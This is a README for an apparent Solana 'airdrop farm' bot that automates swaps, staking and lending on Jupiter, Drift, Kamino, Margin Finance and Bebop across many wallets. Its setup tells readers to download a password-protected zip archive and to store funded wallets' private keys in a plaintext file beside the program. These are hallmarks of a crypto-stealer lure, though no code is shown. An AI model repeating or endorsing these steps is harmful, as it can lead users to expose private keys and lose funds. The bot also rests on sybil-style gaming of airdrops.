### How it works

For each wallet from the list the program performs a number of activities on each protocol of decetralised finance, for example, swap SOL to some other token or provide liquidity in pairs. The work is done with the help of SolanaSDK and Net Framework 4.8. At the moment 5 protocols have been added on the Solana network for token swap.

### Protocols and activities

[jupiter](https://jup.ag):
 - Swapping SOL to USDC/JUP/BONK randomly and back

[drift.tade](https://www.drift.trade):
 - Swapping SOL to USDC/JUP/BONK randomly and back
 - SOL staking and lending
 - Open spot positions on SOL (open and close)

[kamino.finance (Kamino Finance)](https://app.kamino.finance)
 - Supply SOL on borrow/lend
 - Buy JUP/JTO/BONK randomly and deposit to LP

[mfi.gg (Margin Finance)](https://www.mfi.gg)
 - Swapping SOL to USDC/JUP/BONK randomly and back
 - Staking SOL on Eran program
 - Supply SOL to LP

bebop.xyz:
 - Swapping SOL to USDC and back (active and beta versions)

### Setup

!!! DO NOT USE YOUR MAIN WALLETS! PROTOCOLS CAN BE HACKED AND YOU LOSE YOUR MONEY !!!
- Make sure you have [Net Framework 4.8](https://support.microsoft.com/en-us/topic/microsoft-net-framework-4-8-offline-installer-for-windows-9d23f658-3b97-68ab-d013-aa3c3e7495e0) installed.
- [Clone](https://github.com/garbache/solana-airdrop-farm/archive/refs/heads/main.zip) the repository and unzip the repository with pass `yo1Kb65Hku` to folder.
- Create SOL private key list with a balance. A minimum of 0.3 SOL on each address is required.
- Save the list in `privateKeys.txt` next to the programme.
- Edit `settings.json` to configure which projects you want to use for transactions
- Edit the RPC to your own or Shyft's

### Config

```
{
  "General": { 
    "Timeout": "30",
    "RPC": "https://<your-solana-rpc>.com:<port>" // use your own RPC oe Shyft.io
  },
  "WorkingMode": { // which protocols we use
    "Jupiter": "true",
    "Drift": "true",
	"Kamino": "true",
    "Margin": "true",
	"Bebop": "true"
  }
}
```
